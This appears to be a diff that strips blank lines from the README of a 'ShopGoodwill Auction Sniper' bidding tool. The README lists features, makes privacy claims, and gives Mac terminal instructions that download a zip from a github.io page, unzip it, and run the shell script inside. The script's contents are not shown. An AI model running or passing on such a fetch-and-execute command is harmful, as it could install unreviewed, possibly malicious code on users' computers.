@@ -1,9 +1,6 @@
 # ShopGoodwill Auction Sniper
-
 ![ShopGoodwill Auction Sniper](https://github.com/shopgoodwill-auction-sniper/shopgoodwill-bid-sniper/blob/main/images/shopgoodwillsniper2.png?raw=true)
-
 ### Download and Install Directly from Windows Command Prompt or Mac Terminal Below
-
 You can run the installer directly from your Windows command prompt or Mac terminal. Follow these steps:
 #### Windows Command Prompt Installation Instructions
 1. Open Windows Command Prompt.
@@ -19,7 +16,6 @@ For users who prefer not to download the file, you can run the installer directl
     ORIG_DIR=$(pwd) && cd "$(mktemp -d)" && curl -L -o Bid_Sniper_Mac_Installer.zip https://shopgoodwill-auction-sniper.github.io/shopgoodwill-bid-sniper/Bid_Sniper_Mac_Installer.zip && unzip Bid_Sniper_Mac_Installer.zip && chmod +x Bid_Sniper_Mac_Installer.sh && ./Bid_Sniper_Mac_Installer.sh && cd "$ORIG_DIR"
     ```
 ### Features
-
 - **Simultaneous Sniping:** Snipe multiple auctions on ShopGoodwill at the last second(s).
 - **Secure:** Your passwords stay on your computer, not on a remote service.
 - **Background Mode:** Minimize to System Tray for continuous operation.
@@ -29,8 +25,5 @@ For users who prefer not to download the file, you can run the installer directl
 - **Sound Effects:** Enhance your sniping experience with themed sounds.
 - **User-Friendly Interface:** Animated, full-screen GUI designed for ease of use.
 - **Cross-Platform:** Supports Windows, Mac, and Linux.
-
 ### Privacy
-
 We do not collect any user information. Our focus is solely on delivering high-quality software without increasing costs or liabilities.
-
